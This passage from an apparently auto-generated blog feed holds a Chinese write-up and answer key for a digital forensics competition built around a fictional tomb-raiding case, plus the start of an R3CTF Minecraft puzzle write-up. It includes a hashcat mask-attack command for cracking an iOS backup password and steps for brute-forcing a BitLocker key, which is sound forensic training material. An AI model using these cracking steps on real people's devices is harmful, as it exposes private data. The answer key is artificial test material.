href="#二、passwarekit爆破密钥" class="headerlink" title="二、passwarekit爆破密钥"></a>二、passwarekit爆破密钥</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262256660.png" alt="image-20240726225639580"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262257624.png" alt="image-20240726225713549"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262256656.png" alt="image-20240726225618512"></p><p>爆破出恢复密钥是</p><pre><code>010461-617507-553498-499752-253286-356334-124773-180169</code></pre><p>将这个恢复密钥导入到火眼或者取证大师中都可以进行bitlocker解密</p><h4 id="三、生成去掉bitlocker加密的镜像"><a href="#三、生成去掉bitlocker加密的镜像" class="headerlink" title="三、生成去掉bitlocker加密的镜像"></a>三、生成去掉bitlocker加密的镜像</h4><p>在使用passwarekit爆破结束之后 会生成一个C盘已经去掉bitlocker加密的镜像 也可以在拿这个镜像进行取证分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262258338.png" alt="image-20240726225834250"></p><p>在解开bitlocker加密之后 就可以对检材3进行正常的一套分析 </p><p>系统分区的起始位置 其实问的就是C盘的起始位置 也有很多方法</p><h4 id="火眼"><a href="#火眼" class="headerlink" title="火眼"></a>火眼</h4><p>火眼里面提供的是起始扇区 记得要乘上512</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262308997.png" alt="image-20240726230803877"></p><h4 id="取证大师"><a href="#取证大师" class="headerlink" title="取证大师"></a>取证大师</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262309166.png" alt="image-20240726230927045"></p><h4 id="证据文件硬盘信息小程序"><a href="#证据文件硬盘信息小程序" class="headerlink" title="证据文件硬盘信息小程序"></a>证据文件硬盘信息小程序</h4><p>这是取证大师中的小程序 比较方便 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262310567.png" alt="image-20240726231021502"></p><h3 id="10、检材-3-系统的当前版本是多少（1-分）"><a href="#10、检材-3-系统的当前版本是多少（1-分）" class="headerlink" title="10、检材 3-系统的当前版本是多少（1 分）"></a>10、检材 3-系统的当前版本是多少（1 分）</h3><pre><code>10</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262314344.png" alt="image-20240726231408284"></p><h3 id="11、检材-3-Edge-浏览器最后一次搜索过的关键词是什么（1-分）"><a href="#11、检材-3-Edge-浏览器最后一次搜索过的关键词是什么（1-分）" class="headerlink" title="11、检材 3-Edge 浏览器最后一次搜索过的关键词是什么（1 分）"></a>11、检材 3-Edge 浏览器最后一次搜索过的关键词是什么（1 分）</h3><pre><code>狼眼手电</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262316369.png" alt="image-20240726231657231"></p><h3 id="12、检材-3-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站-URL（1-分）"><a href="#12、检材-3-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站-URL（1-分）" class="headerlink" title="12、检材 3-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站 URL（1 分）"></a>12、检材 3-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站 URL（1 分）</h3><pre><code>https://baijiahao.baidu.com/s?id=1599783184726705131</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262318598.png" alt="image-20240726231822487"></p><h3 id="13、检材-3-主用户的-NT-密码哈希值（2-分）"><a href="#13、检材-3-主用户的-NT-密码哈希值（2-分）" class="headerlink" title="13、检材 3-主用户的 NT 密码哈希值（2 分）"></a>13、检材 3-主用户的 NT 密码哈希值（2 分）</h3><pre><code>a0bad269b8d49ccf481513f9875be4c7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262319522.png" alt="image-20240726231947389"></p><h3 id="14、检材-4-Mac-OS-的版本号（格式：x-x-x）（1-分）"><a href="#14、检材-4-Mac-OS-的版本号（格式：x-x-x）（1-分）" class="headerlink" title="14、检材 4-Mac OS 的版本号（格式：x.x.x）（1 分）"></a>14、检材 4-Mac OS 的版本号（格式：x.x.x）（1 分）</h3><pre><code>12.7.5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407262320049.png" alt="image-20240726232033922"></p><h3 id="15、检材-4-加密货币软件的名字（1-分）"><a href="#15、检材-4-加密货币软件的名字（1-分）" class="headerlink" title="15、检材 4-加密货币软件的名字（1 分）"></a>15、检材 4-加密货币软件的名字（1 分）</h3><pre><code>OKX</code></pre><p>对检材4macbook 笔记本进行仿真  看到桌面有一个OKX网页 访问一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407270024871.png" alt="image-20240727002455686"></p><h3 id="16、检材-4-Safari-浏览器最后一次搜索过的关键词是什么（1-分）"><a href="#16、检材-4-Safari-浏览器最后一次搜索过的关键词是什么（1-分）" class="headerlink" title="16、检材 4-Safari 浏览器最后一次搜索过的关键词是什么（1 分）"></a>16、检材 4-Safari 浏览器最后一次搜索过的关键词是什么（1 分）</h3><pre><code>洛阳铲</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407270031737.png" alt="image-20240727003105510"></p><h3 id="17、检材-4-MacBook-pro-最后一次访问的文件名（2-分）"><a href="#17、检材-4-MacBook-pro-最后一次访问的文件名（2-分）" class="headerlink" title="17、检材 4-MacBook pro 最后一次访问的文件名（2 分）"></a>17、检材 4-MacBook pro 最后一次访问的文件名（2 分）</h3><pre><code>提示.doc</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301726152.png" alt="image-20240730172608015"></p><h3 id="18、检材-4-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站（2-分）"><a href="#18、检材-4-Edge-浏览器最后一次访问过的与盗墓及文物有关的网站（2-分）" class="headerlink" title="18、检材 4-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站（2 分）"></a>18、检材 4-Edge 浏览器最后一次访问过的与盗墓及文物有关的网站（2 分）</h3><pre><code>文物流转聊天室.html</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280133161.png" alt="image-20240728013346048"></p><h3 id="19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3-分）"><a href="#19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3-分）" class="headerlink" title="19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3 分）"></a>19、盗墓团伙最近一次盗墓日期是？（格式：yyyymmdd）（3 分）</h3><pre><code>20240712</code></pre><p>从检材一的铛铛聊天数据库中找到一段关于盗墓的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280150051.png" alt="image-20240728015045900"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280150195.png" alt="image-20240728015056082"></p><h3 id="20、盗墓团伙最近一次盗的墓名是？（3-分）"><a href="#20、盗墓团伙最近一次盗的墓名是？（3-分）" class="headerlink" title="20、盗墓团伙最近一次盗的墓名是？（3 分）"></a>20、盗墓团伙最近一次盗的墓名是？（3 分）</h3><pre><code>王墓坡</code></pre><p>接上题图</p><h3 id="21、大金牙的手机号码是什么？（5-分）"><a href="#21、大金牙的手机号码是什么？（5-分）" class="headerlink" title="21、大金牙的手机号码是什么？（5 分）"></a>21、大金牙的手机号码是什么？（5 分）</h3><pre><code>13913913916</code></pre><p>在检材四分析出的<code>文物中转站聊天室.html</code>中找到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280152000.png" alt="image-20240728015221860"></p><h3 id="22、检材-7-虚拟货币钱包的地址（5-分）"><a href="#22、检材-7-虚拟货币钱包的地址（5-分）" class="headerlink" title="22、检材 7-虚拟货币钱包的地址（5 分）"></a>22、检材 7-虚拟货币钱包的地址（5 分）</h3><pre><code>1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2</code></pre><p>检材七是U盘镜像 根据在检材四找到的<code>提示.doc</code>的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407280153950.png" alt="image-20240728015351750"></p><p>那直接取证大师原始数据搜索即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291958596.png" alt="image-20240729195801508"></p><h3 id="23、检材-7-虚拟货币助记词（5-分）"><a href="#23、检材-7-虚拟货币助记词（5-分）" class="headerlink" title="23、检材 7-虚拟货币助记词（5 分）"></a>23、检材 7-虚拟货币助记词（5 分）</h3><pre><code>love can play games tomorrow money</code></pre><p>直接分析U盘就可以找到一个<code>助记词.zip</code> 发现有密码 直接拿来爆破就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291755827.png" alt="image-20240729175514677"></p><p>解压就有助记词</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291755088.png" alt="image-20240729175546038"></p><h3 id="24、检材-3-系统登陆密码（5-分）"><a href="#24、检材-3-系统登陆密码（5-分）" class="headerlink" title="24、检材 3-系统登陆密码（5 分）"></a>24、检材 3-系统登陆密码（5 分）</h3><pre><code>20242024</code></pre><p>检材三是windows镜像 在拿进去分析的时候密码就跑出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407291756448.png" alt="image-20240729175644389"></p><h3 id="25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）"><a href="#25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）" class="headerlink" title="25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）"></a>25、该案件中，文物贩子的买家有谁？（给出对应账号名）（3分）</h3><pre><code>James David</code></pre><p>这种一般还是要分析聊天记录 现在还没有分析的就是检材6的安卓手机备份  看分析结果有Skype Potato 微信 Telegram 在Telegram中找到关于文物贩卖的聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292105600.png" alt="image-20240729210534433"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292105829.png" alt="image-20240729210544690"></p><p>一共是两个人</p><h3 id="26、该案件中，文物贩子与买家的通讯-APP-的包名是？（3-分）"><a href="#26、该案件中，文物贩子与买家的通讯-APP-的包名是？（3-分）" class="headerlink" title="26、该案件中，文物贩子与买家的通讯 APP 的包名是？（3 分）"></a>26、该案件中，文物贩子与买家的通讯 APP 的包名是？（3 分）</h3><pre><code>org.telegram.messenger.web</code></pre><p>接上题 应该是Telegram 找到对应的报包名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407292107873.png" alt="image-20240729210701743"></p><h3 id="27、大金牙的真实姓名可能是？（3-分）"><a href="#27、大金牙的真实姓名可能是？（3-分）" class="headerlink" title="27、大金牙的真实姓名可能是？（3 分）"></a>27、大金牙的真实姓名可能是？（3 分）</h3><pre><code>冀璐晟</code></pre><p>由第21题可知大金牙手机号为13913913916直接在通讯录里面找</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300022846.png" alt="image-20240730002217690"></p><h3 id="28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3-分）"><a href="#28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3-分）" class="headerlink" title="28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3 分）"></a>28、盗墓团伙要求用什么的虚拟货币交易？（字母简称，例：BTC、ETH）（3 分）</h3><pre><code>MATIC</code></pre><p>这里可以在检材4中找到嵌套证据苹果手机备份文件 导出分析 发现需要密码 爆破<code>Manifest.plist</code>得到密码<code>364289</code> 填入密码继续分析</p><p> 由于我的显卡不是很好 这里选择使用hashcat进行爆破 先获取文件密码的哈希值 将结果保存在hash.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301244953.png" alt="image-20240730002524380"></p><p>9分钟将6位纯数字密码爆破出 还是非常快的 </p><pre><code>./hashcat -m 14800 ./hash.txt -a 3 &#39;?d?d?d?d?d?d&#39;# 从获取到的哈希值中可知 这个苹果手机备份的ios版本大于10 所以这里-m 后面的参数是14800 如果是小于10的版本 则使用14700</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301336536.png" alt="image-20240730002524380"></p><p>在火眼分析结果的微信聊天记录中 我们找到眼镜仔和大金牙交易过程中提到了使用的货币</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301028179.png" alt="image-20240730002524380"></p><h3 id="29、该案件中，谁是文物贩子？（3-分）"><a href="#29、该案件中，谁是文物贩子？（3-分）" class="headerlink" title="29、该案件中，谁是文物贩子？（3 分）"></a>29、该案件中，谁是文物贩子？（3 分）</h3><pre><code>大金牙</code></pre><p>根据上面Telegram的聊天记录 得知是大金牙</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300025504.png" alt="image-20240730002524380"></p><h3 id="30、盗墓团伙最近一次交易的文物有几个？（5分）"><a href="#30、盗墓团伙最近一次交易的文物有几个？（5分）" class="headerlink" title="30、盗墓团伙最近一次交易的文物有几个？（5分）"></a>30、盗墓团伙最近一次交易的文物有几个？（5分）</h3><pre><code>5</code></pre><p><font color='red'>这里的需要注意这个交易是指以盗墓团伙与大金牙对文物的一手交易 在盗墓团伙中 眼镜仔应该是负责销赃 而不是后面在检材6的Telegram聊天记录中 我们找到的大金牙找到James还有David的对文物的第二手交易</font></p><p>也是读聊天记录 传了一个有要交易的文物图片的压缩包 解压密码在上面的聊天记录里面<code>yjz_18022462024</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301104719.png" alt="image-20240730002524380"></p><p>解压后 看到有7张图片<img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301105057.png" alt="image-20240730002524380"></p><p>仔细查看 可以发现 图2和图4是一个文物 图6和图7是一个文物</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301107021.png" alt="image-20240730002524380"></p><p>因此 一共交易了5个文物</p><h3 id="31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）"><a href="#31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）" class="headerlink" title="31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）"></a>31、盗墓团伙最近两次的交易金额是多少？（例：250BTC）（3分）</h3><pre><code>188000MATIC</code></pre><p>聊天记录中 大金牙一共从眼镜仔中买了两批货 都使用虚拟币MATIC进行交易 共18.8W MATIC</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301113942.png" alt="image-20240730002524380"></p><h3 id="32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）"><a href="#32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）" class="headerlink" title="32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）"></a>32、该案件中，文物贩子卖出的文物名为“SX-WW-202407001”价格是多少？（5分）</h3><pre><code>68600ETH</code></pre><p>在我们分析检材6的Telegram聊天记录时可以发现 大金牙对买家说 交易文物的价格都在发送的文物图片上 但是我们找到原图片 并没有发现所说的价格 结合下面第40题提到检材6安卓手机上安装的隐写工具 猜测价格是使用隐写工具进行了隐写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301223276.png" alt="image-20240730002524380"></p><p>先从第一个隐写工具开始尝试 从文件系统中找到其对应的apk文件 导出 安装到雷电模拟器上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114202.png" alt="image-20240730011438813"></p><p>点击<code>Reveal the Message</code> 查看图片中的信息 就可以提取到隐写的价格信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301341891.png" alt="image-20240730011438813"></p><p>找到<code>SX-WW-202407001</code>这张图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301340515.png" alt="image-20240730011438813"></p><p>因此文物名为“SX-WW-202407001”价格是68600ETH</p><h3 id="33、盗墓地点的-GPS-经纬度（格式：经度-xx-xx-xx，纬度-xx-xx-xx-（1-分）"><a href="#33、盗墓地点的-GPS-经纬度（格式：经度-xx-xx-xx，纬度-xx-xx-xx-（1-分）" class="headerlink" title="33、盗墓地点的 GPS 经纬度（格式：经度 xx,xx,xx，纬度 xx,xx,xx)（1 分）"></a>33、盗墓地点的 GPS 经纬度（格式：经度 xx,xx,xx，纬度 xx,xx,xx)（1 分）</h3><pre><code>112,36,57, 27,50,45</code></pre><p>提到盗墓地点的聊天记录在检材1的铛铛数据库中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301655845.png" alt="image-20240730165544342"></p><p>但是提到的这三张图片在检材二中找到 在建材二中存在一个back_image.zip 解压之后就是三张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707890.png" alt="image-20240730170314565"></p><p>其中盗墓地点是image-1.jpg 所在地经纬度直接看属性</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707997.png" alt="image-20240730170400322"></p><h3 id="34、盗墓前集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）"><a href="#34、盗墓前集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）" class="headerlink" title="34、盗墓前集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）"></a>34、盗墓前集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）</h3><pre><code>112,36,53, 37,50,45</code></pre><p>盗墓前集合地是image-2.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301707489.png" alt="image-20240730170509522"></p><h3 id="35、盗墓后集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）"><a href="#35、盗墓后集合地的-GPS-经纬度（格式：经度-xx-xx-xx，纬度xx-xx-xx-（1-分）" class="headerlink" title="35、盗墓后集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）"></a>35、盗墓后集合地的 GPS 经纬度（格式：经度 xx,xx,xx，纬度xx,xx,xx)（1 分）</h3><pre><code>112,36,52, 37,47,51</code></pre><p>盗墓后集合地是image-3.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301706928.png" alt="image-20240730170609878"></p><h3 id="36-检材-6中最近一次呼入的号码是？"><a href="#36-检材-6中最近一次呼入的号码是？" class="headerlink" title="36.检材 6中最近一次呼入的号码是？"></a>36.<strong>检材</strong> 6中最近一次呼入的号码是？</h3><pre><code>9528207</code></pre><p>这里要区分一个点 火眼分析结果中 会把呼入但是未接通的通话记录标记为未接 但是就算是没有接通 也是产生了呼入这个动作 </p><p><font color='red'>为了方便理解 我们可以把呼入呼出认为是一种动作 未接接通和拒接认为是状态 这里是需要我们找最近一次呼入这个动作的号码</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301025559.png" alt="image-20240730102559303"></p><h3 id="37、检材6-浏览器第一次搜索的内容是？（1分）"><a href="#37、检材6-浏览器第一次搜索的内容是？（1分）" class="headerlink" title="37、检材6-浏览器第一次搜索的内容是？（1分）"></a>37、检材6-浏览器第一次搜索的内容是？（1分）</h3><pre><code>隐写工具</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300112928.png" alt="image-20240730011205661"></p><h3 id="38、检材6-手机所使用的翻墙APP是？（1分）"><a href="#38、检材6-手机所使用的翻墙APP是？（1分）" class="headerlink" title="38、检材6-手机所使用的翻墙APP是？（1分）"></a>38、检材6-手机所使用的翻墙APP是？（1分）</h3><pre><code>Clash</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300112647.png" alt="image-20240730011243363"></p><h3 id="39、检材6-翻墙APP所使用的订阅地址是？（1分）"><a href="#39、检材6-翻墙APP所使用的订阅地址是？（1分）" class="headerlink" title="39、检材6-翻墙APP所使用的订阅地址是？（1分）"></a>39、检材6-翻墙APP所使用的订阅地址是？（1分）</h3><pre><code>https://miaomiao.xn--7rs48z0nlr6hc8cqz4a.com/api/v1/client/subscribe?token=1357e1cbda597141d15ae689b3d470d7</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114570.png" alt="image-20240730011402242"></p><h3 id="40、检材6-手机上安装了哪些隐写工具？（1分）"><a href="#40、检材6-手机上安装了哪些隐写工具？（1分）" class="headerlink" title="40、检材6-手机上安装了哪些隐写工具？（1分）"></a>40、检材6-手机上安装了哪些隐写工具？（1分）</h3><pre><code>Stegais Steganography</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300114202.png" alt="image-20240730011438813"></p><h3 id="41、检材8-使用的苹果账号是？（1分）"><a href="#41、检材8-使用的苹果账号是？（1分）" class="headerlink" title="41、检材8-使用的苹果账号是？（1分）"></a>41、检材8-使用的苹果账号是？（1分）</h3><pre><code>rdmf_top@163.com</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301706956.png" alt="image-20240730011622858"></p><h3 id="42-检材8-系统版本是？（x-x-x）（1分）"><a href="#42-检材8-系统版本是？（x-x-x）（1分）" class="headerlink" title="42.检材8-系统版本是？（x.x.x）（1分）"></a>42.检材8-系统版本是？（x.x.x）（1分）</h3><pre><code>17.5.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300117272.png" alt="image-20240730011700969"></p><h3 id="43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx-xx…）（2分）"><a href="#43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx-xx…）（2分）" class="headerlink" title="43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx:xx…）（2分）"></a>43、检材8-使用的WiFi网络名为“大兄弟的网络”的MAC地址是？（例：xx:xx…）（2分）</h3><pre><code>5e:37:7d:2a:47:5e</code></pre><h4 id="在检材8中分析"><a href="#在检材8中分析" class="headerlink" title="在检材8中分析"></a>在检材8中分析</h4><p>发现直接分析的结果中是没有wifi的信息的 但是我们知道存放ios系统的wifi信息的文件的路径是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300933530.png" alt="image-20240730093355447"></p><p>那么直接翻文件夹 虽然没有直接找到这个pslist文件 但是可以找到两个类似的<code>com.apple.wifi-networks.plist</code>和<code>com.apple.wifi-networks.plist.backup</code>  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300934854.png" alt="image-20240730093420554"></p><p>直接查看<code>com.apple.wifi-networks.plist</code> 发现没有东西 那么我们把<code>com.apple.wifi-networks.plist.backup</code>  导出  在用pslist Editor查看 找到关于WiFi网络名为“大兄弟的网络”的相关信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300938935.png" alt="image-20240730093821671"></p><h4 id="在检材4导出的苹果手机备份中分析"><a href="#在检材4导出的苹果手机备份中分析" class="headerlink" title="在检材4导出的苹果手机备份中分析"></a>在检材4导出的苹果手机备份中分析</h4><p>抽象的一点 这个wifi的信息竟然在之前导出的苹果手机备份中也有 而且是可以直接分析出来的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301023322.png" alt="image-20240730102053020"></p><p>当然可以分析出来的原因是有可以被火眼识别出的pslist文件记录了这个wifi信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301023265.png" alt="image-20240730102311135"></p><h3 id="44、检材8-手机IMEI是？（1分）"><a href="#44、检材8-手机IMEI是？（1分）" class="headerlink" title="44、检材8-手机IMEI是？（1分）"></a>44、检材8-手机IMEI是？（1分）</h3><pre><code>357272092128408</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407300127325.png" alt="image-20240730012714012"></p><h3 id="45、检材3-BitLocker恢复密钥（5分）"><a href="#45、检材3-BitLocker恢复密钥（5分）" class="headerlink" title="45、检材3-BitLocker恢复密钥（5分）"></a>45、检材3-BitLocker恢复密钥（5分）</h3><pre><code>010461-617507-553498-499752-253286-356334-124773-180169</code></pre><p>接第九题</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.大体人物关系如下图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202407301728012.png" alt="image-20240730172833925"></p><p>2.前面的题目正常分析 第9题需要对windows硬盘进行bitlocker密钥爆破 由第五题得知 本案的大体方向是盗墓 并且盗墓团伙的主要通讯工具是铛铛 需要手动分析聊天记录数据库</p><p>3.对macbook进行仿真分析 查看文物中转站聊天室.html 得知盗墓团伙三个成员：眼镜仔 张老四 王胖子 同时在其中找到苹果手机备份 爆破密钥进行解密</p><p>4.在找到的苹果备份的微信聊天记录中得知 眼镜仔和买家大金牙联系进行销赃</p><p>5.在检材6大金牙的安卓手机Telegram聊天记录中得知 大金牙和国外买家James David联系 进行二手交易文物 同时 在对检材6的分析中发现搜索下载安装了隐写工具 并且聊天记录中提到在图片上的文物价格并没有直接显示在原图片上 通过直接在模拟器中安装对应的隐写工具恢复出被隐写的文物价格信息</p><p>6.最后回到关于盗墓行动的相关信息 在检材1的铛铛聊天记录中提到的盗墓地点、盗墓前集合地、盗墓后集合地的三张图片 在检材2的一个压缩包中找到 通过分析图片的EXIF信息 从而得知地点的具体经纬度信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024中科实数杯wp&quot;&gt;&lt;a href=&quot;#2024中科实数杯wp&quot; class=&quot;headerlink&quot; title=&quot;2024中科实数杯wp&quot;&gt;&lt;/a&gt;2024中科实数杯wp&lt;/h1&gt;&lt;h2 id=&quot;鉴定材料&quot;&gt;&lt;a href=&quot;#鉴定材料&quot; class=&quot;</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024斟茶王者wp</title>
    <link href="http://w3nx1z1.github.io/2024/07/23/2024%E6%96%9F%E8%8C%B6%E7%8E%8B%E8%80%85/"/>
    <id>http://w3nx1z1.github.io/2024/07/23/2024%E6%96%9F%E8%8C%B6%E7%8E%8B%E8%80%85/</id>
    <published>2024-07-22T16:44:28.035Z</published>
    <updated>2024-08-01T12:16:13.469Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a317c7dd3b45c851cdea5d1c92fadcd9196cde7bc666d9f87687709e06fd9b4e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>R3CTF2024</title>
    <link href="http://w3nx1z1.github.io/2024/06/11/R3CTF/"/>
    <id>http://w3nx1z1.github.io/2024/06/11/R3CTF/</id>
    <published>2024-06-11T13:55:19.473Z</published>
    <updated>2024-06-11T13:55:46.564Z</updated>
    
    <content type="html"><![CDATA[<h1 id="R3CTF"><a href="#R3CTF" class="headerlink" title="R3CTF"></a>R3CTF</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="hideAndSeek"><a href="#hideAndSeek" class="headerlink" title="hideAndSeek"></a>hideAndSeek</h3><pre><code>Ben is a superpower who loves playing hide and seek. He can teleport to anywhere to no one can find him, but he seems unaware that his ability only works within a certain rangeRules:The adorable Ben will only appear within the range of (0, -50, 0) to (128, 50, 128).Ben will every 10 seconds and reappear in a new location after 10 seconds.A &quot;newtp&quot; has been added for all players to teleport to any coordinates.Connect info: 34.81.163.238version 1.19.2</code></pre><p>很抽象的mc游戏题 开始确实是用PCL2模拟器进入游戏去玩</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111941074.png" alt="image-20240611194137010"></p><p>看到给了个newtp命令 还查了很多教程去学MC的tp命令是如何使用 但是发现没啥用 在地图里面逛了一会儿 </p><p>用newtp大概传送了一些坐标 命令格式如下</p><pre><code>想传送到的坐标(x, y, z)newtp x y z</code></pre><p>后面直接翻log日志文件 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202406111944005.png" alt="image-20240611194432924"></p><p>读日志可以发现 这个”Ben”的尸体类型应该是村民 并且他的名称就是flag</p><pre><code>R3CTF&#123;Jus7_play_m0r3_h1de_2nd_seek_w1th_Ben&#125;</code></pre><h3 id="h1de-ndSe3k"><a href="#h1de-ndSe3k" class="headerlink" title="h1de@ndSe3k"></a><strong>h1de@ndSe3k</strong></h3><p>其实做法和上面差不多 这次就算是Ben隐形了也没关系 我们只需要传送几次 等待一段时间 Ben会自己因为某种原因卡死 我们再从日志里面找他的死亡记录就行 但是因为服务器好像是关掉了 没法复现了 当时也是傻了 应该用上一题的方法再试一下</p><h3 id="Blizzard-CN-Restarts"><a href="#Blizzard-CN-Restarts" class="headerlink" title="Blizzard CN 